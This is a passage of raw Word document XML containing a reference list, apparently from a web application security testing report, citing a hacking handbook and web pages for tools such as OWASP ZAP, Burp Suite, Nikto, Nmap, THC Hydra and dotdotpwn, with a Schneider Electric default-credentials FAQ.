          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="-1058868351"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtContent>
        <w:p w14:paraId="2F7B035B" w14:textId="396B3232" w:rsidR="00510F46" w:rsidRDefault="00510F46">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
        </w:p>
        <w:sdt>
          <w:sdtPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtContent>
            <w:p w14:paraId="78578EFA" w14:textId="39C08824" w:rsidR="001A29F9" w:rsidRPr="00BC6B88" w:rsidRDefault="001A29F9" w:rsidP="001A29F9">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Stuttard</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>, D. and Pinto, M. (2013) </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>The web application hacker's handbook</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. Hoboken, N.J.:</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1F8D321D" w14:textId="077BF4F5" w:rsidR="001A29F9" w:rsidRDefault="001A29F9" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>OWASP Zed Attack Proxy Project - OWASP</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2062DE82" w14:textId="0F56B2B7" w:rsidR="001A29F9" w:rsidRDefault="001A29F9" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">Burp Suite Scanner | </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>PortSwigger</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://portswigger.net/burp (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0C12BEA5" w14:textId="664FC6E9" w:rsidR="0081487D" w:rsidRDefault="0081487D" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:proofErr w:type="gramStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Category:OWASP</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:proofErr w:type="gramEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>DirBuster</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> Project - OWASP</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5A375E8A" w14:textId="3D573412" w:rsidR="001A29F9" w:rsidRDefault="00BC6B88" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="0081487D">
                <w:rPr>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Chapter 4. Command Line Options (2018). Available at: https://cirt.net/nikto2-docs/options.html (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="55755E65" w14:textId="07C12805" w:rsidR="00B42C6B" w:rsidRDefault="00B42C6B" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>httprint</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> Download – Web Server Fingerprinting Tool - Darknet</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.darknet.org.uk/2007/09/httprint-v301-web-server-fingerprinting-tool-download/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="18290E2D" w14:textId="51F4B95E" w:rsidR="00B42C6B" w:rsidRDefault="00B42C6B" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Wappalyzer</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> - Identify technologies on websites</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.wappalyzer.com/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="3478322D" w14:textId="04EC154B" w:rsidR="002A1765" w:rsidRPr="0081487D" w:rsidRDefault="002A1765" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Nmap</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">: </w:t>
              </w:r>
              <w:proofErr w:type="gramStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>the</w:t>
              </w:r>
              <w:proofErr w:type="gramEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> Network Mapper - Free Security Scanner</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://nmap.org/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5094C6AA" w14:textId="77777777" w:rsidR="0072376D" w:rsidRDefault="0072376D" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Wget</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> - GNU Project - Free Software Foundation</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.gnu.org/software/wget/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0D3FE795" w14:textId="77777777" w:rsidR="00606113" w:rsidRDefault="0072376D" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="gramStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>grep(</w:t>
              </w:r>
              <w:proofErr w:type="gramEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>1) - Linux manual page</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: http://man7.org/linux/man-pages/man1/grep.1.html (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5EEB3558" w14:textId="77777777" w:rsidR="00016B98" w:rsidRDefault="00606113" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">THC Hydra – </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>SecTools</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> Top Network Security Tools</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://sectools.org/tool/hydra/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="235CE839" w14:textId="4B08E973" w:rsidR="00000FCE" w:rsidRDefault="00016B98" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">Cookie Manager – Get this Extension for </w:t>
              </w:r>
              <w:r w:rsidR="00E4158A">
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Firefox</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>en</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>-US)</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://addons.mozilla.org/en-US/</w:t>
              </w:r>
              <w:r w:rsidR="00E4158A">
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Firefox</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>/addon/a-cookie-manager/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5E8FF275" w14:textId="77777777" w:rsidR="0033199E" w:rsidRDefault="00000FCE" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>wireghoul</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>/</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>dotdotpwn</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://github.com/wireghoul/dotdotpwn (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="17775AA4" w14:textId="77777777" w:rsidR="0033199E" w:rsidRDefault="0033199E" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>What is the Default user name &amp; password of FTP/Web Server of M241</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (</w:t>
              </w:r>
              <w:proofErr w:type="gramStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>2018).</w:t>
              </w:r>
              <w:proofErr w:type="gramEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> Available at: https://www.schneider-electric.co.in/en/faqs/FA333074/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6FDE06DE" w14:textId="77777777" w:rsidR="00C8024C" w:rsidRDefault="0033199E" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">Download </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
